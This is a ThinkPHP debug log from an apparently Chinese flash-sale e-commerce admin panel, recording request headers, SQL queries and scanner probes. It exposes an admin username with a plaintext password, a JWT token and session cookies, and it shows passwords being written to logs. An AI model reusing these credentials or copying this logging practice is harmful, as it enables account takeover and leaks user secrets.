---------------------------------------------------------------
[ 2021-01-05T00:48:04+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/goods/index.html
[运行时间：0.032479s] [吞吐率：30.79req/s] [内存消耗：2,297.46kb] [文件加载：44]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'goods',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/main/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609750127',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
  0 => 'code',
  1 => 'msg',
  2 => 'data',
  3 => 'url',
  4 => 'wait',
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T00:48:06+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/login/index.html
[运行时间：0.019796s] [吞吐率：50.51req/s] [内存消耗：2,188.78kb] [文件加载：41]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/goods/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609750127',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Login.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/login/index.html [ array (
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T00:48:12+08:00 ] 115.27.209.67 POST 101.37.13.45/index.php/admin/login/dologin
[运行时间：0.043398s] [吞吐率：23.04req/s] [内存消耗：3,420.70kb] [文件加载：51]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'dologin',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'origin' => 'http://101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/login/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609750127',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '33',
)
[ info ] [ PARAM ] array (
  'username' => 'shangpin',
  'password' => '123456',
)
[ info ] [ RUN ] app\admin\controller\Login->dologin[ /www/wwwroot/101.37.13.45/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/thinkphp/tpl/dispatch_jump.tpl [ array (
  0 => 'code',
  1 => 'msg',
  2 => 'data',
  3 => 'url',
  4 => 'wait',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000347s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.001096s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`password` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000420s ]
[ sql ] [ SQL ] UPDATE `user`  SET `token`='eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM'  WHERE  `username` = 'shangpin' [ RunTime:0.009075s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000713s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000233s ]
---------------------------------------------------------------
[ 2021-01-05T00:48:13+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/main/index.html
[运行时间：0.044281s] [吞吐率：22.58req/s] [内存消耗：3,387.80kb] [文件加载：50]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'main',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/login/dologin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609750127; username=shangpin; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Main->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Main.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/main/index.html [ array (
  0 => 'username',
  1 => 'menu',
  2 => 'lists',
  3 => 'user',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000418s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000730s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000352s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000500s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000179s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000532s ]
[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 2 [ RunTime:0.000245s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000522s ]
[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Main' , 'index' , 2 , 'shangpin' , '1931202883' , '1609778893') [ RunTime:0.010589s ]
[ sql ] [ SQL ] SELECT * FROM `user` [ RunTime:0.000299s ]
---------------------------------------------------------------
[ 2021-01-05T00:48:15+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/goods/index.html
[运行时间：0.038389s] [吞吐率：26.05req/s] [内存消耗：3,389.57kb] [文件加载：50]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'goods',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/main/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; username=shangpin; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609778894',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Goods->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Goods.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/goods/index.html [ array (
  0 => 'username',
  1 => 'menu',
  2 => 'lists',
  3 => 'goods_size',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000344s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000693s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000223s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000504s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000166s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000525s ]
[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 2 [ RunTime:0.000209s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000491s ]
[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Goods' , 'index' , 2 , 'shangpin' , '1931202883' , '1609778895') [ RunTime:0.005035s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `goods` [ RunTime:0.000602s ]
[ sql ] [ SQL ] SELECT * FROM `goods` [ RunTime:0.000198s ]
---------------------------------------------------------------
[ 2021-01-05T00:48:19+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/order/index.html
[运行时间：0.062705s] [吞吐率：15.95req/s] [内存消耗：3,669.50kb] [文件加载：56]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'order',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/goods/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; username=shangpin; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609778896',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Order->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Order.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/order/index.html [ array (
  0 => 'username',
  1 => 'menu',
  2 => 'lists',
  3 => 'orders_size',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000504s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000715s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000241s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000502s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000163s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000490s ]
[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 2 [ RunTime:0.000197s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000878s ]
[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Order' , 'index' , 2 , 'shangpin' , '1931202883' , '1609778899') [ RunTime:0.017001s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `orders` [ RunTime:0.000831s ]
[ sql ] [ SQL ] SELECT * FROM `orders` [ RunTime:0.000275s ]
[ error ] [8]未定义数组索引: user_id[/www/wwwroot/101.37.13.45/runtime/temp/4eb1e0c9bbeed0df52f99273e742b70e.php:90]
---------------------------------------------------------------
[ 2021-01-05T00:48:42+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/order/index.html
[运行时间：0.042532s] [吞吐率：23.51req/s] [内存消耗：3,585.90kb] [文件加载：52]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'order',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/goods/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; username=shangpin; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609778896',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Order->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Order.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/order/index.html [ array (
  0 => 'username',
  1 => 'menu',
  2 => 'lists',
  3 => 'orders_size',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000725s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000224s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000571s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000585s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000561s ]
[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 2 [ RunTime:0.000227s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000518s ]
[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Order' , 'index' , 2 , 'shangpin' , '1931202883' , '1609778922') [ RunTime:0.004562s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `orders` [ RunTime:0.000585s ]
[ sql ] [ SQL ] SELECT * FROM `orders` [ RunTime:0.000164s ]
---------------------------------------------------------------
[ 2021-01-05T00:49:11+08:00 ] 115.27.209.67 GET 101.37.13.45/index.php/admin/order/index.html
[运行时间：0.042571s] [吞吐率：23.49req/s] [内存消耗：3,386.20kb] [文件加载：50]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'order',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'connection' => 'keep-alive',
  'cache-control' => 'max-age=0',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'referer' => 'http://101.37.13.45/index.php/admin/goods/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.9',
  'cookie' => 'PHPSESSID=54ftnqg698qpnqqkd2gf2ucua7; Hm_lvt_b393d153aeb26b46e9431fabaf0f6190=1609518864,1609671372; username=shangpin; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoic2hhbmdwaW4iLCJpc3MiOiJ5dXl1IiwiYXVkIjoieXV5dSIsImlhdCI6MTYwOTc3ODg5MiwibmJmIjoxNjA5Nzc4ODkyLCJleHAiOjE2MDk3ODAwOTJ9.Fb8UWuB_VvVqX2lMuWglwvwhKdDaTva0djAyxCFKYhM; Hm_lpvt_b393d153aeb26b46e9431fabaf0f6190=1609778924',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\admin\controller\Order->index[ /www/wwwroot/101.37.13.45/application/admin/controller/Order.php ]
[ info ] [ VIEW ] /www/wwwroot/101.37.13.45/public/../application/admin/view/order/index.html [ array (
  0 => 'username',
  1 => 'menu',
  2 => 'lists',
  3 => 'orders_size',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000383s ] mysql:host=127.0.0.1;dbname=miaosha;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `user` [ RunTime:0.000829s ]
[ sql ] [ SQL ] SELECT `user_id`,`username`,`token` FROM `user` WHERE  `username` = 'shangpin' LIMIT 1 [ RunTime:0.000281s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `role_user` [ RunTime:0.000576s ]
[ sql ] [ SQL ] SELECT `role_id` FROM `role_user` WHERE  `user_id` = 2 LIMIT 1 [ RunTime:0.000168s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `access` [ RunTime:0.000635s ]
[ sql ] [ SQL ] SELECT * FROM `access` `a` INNER JOIN `node` `n` ON `a`.`node_id`=`n`.`node_id` WHERE  `role_id` = 2 [ RunTime:0.000209s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `admin_log` [ RunTime:0.000635s ]
[ sql ] [ SQL ] INSERT INTO `admin_log` (`querystring` , `m` , `c` , `a` , `user_id` , `username` , `ip` , `time`) VALUES ('' , 'admin' , 'Order' , 'index' , 2 , 'shangpin' , '1931202883' , '1609778951') [ RunTime:0.005322s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `orders` [ RunTime:0.000635s ]
[ sql ] [ SQL ] SELECT * FROM `orders` [ RunTime:0.000279s ]
---------------------------------------------------------------
[ 2021-01-05T01:42:27+08:00 ] 192.241.224.64 GET 101.37.13.45/
[运行时间：0.014912s] [吞吐率：67.06req/s] [内存消耗：1,758.84kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T01:44:57+08:00 ] 151.127.3.30 GET 101.37.13.45/
[运行时间：0.015837s] [吞吐率：63.14req/s] [内存消耗：1,758.51kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '101.37.13.45',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T01:49:11+08:00 ] 198.143.155.122 GET 101.37.13.45/
[运行时间：0.015819s] [吞吐率：63.21req/s] [内存消耗：1,759.23kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T02:39:09+08:00 ] 83.97.20.31 GET 101.37.13.45:80/
[运行时间：0.014809s] [吞吐率：67.53req/s] [内存消耗：1,758.44kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T02:39:51+08:00 ] 83.97.20.31 GET 101.37.13.45:80/
[运行时间：0.014489s] [吞吐率：69.02req/s] [内存消耗：1,758.44kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
  'host' => '101.37.13.45:80',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/101.37.13.45/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2021-01-05T03:44:10+08:00 ] 37.46.150.227 GET 101.37.13.45:80/
[运行时间：0.015264s] [吞吐率：65.51req/s] [内存消耗：1,759.83kb] [文件加载：33]
[ info ] [ LANG ] /www/wwwroot/101.37.13.45/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => '',
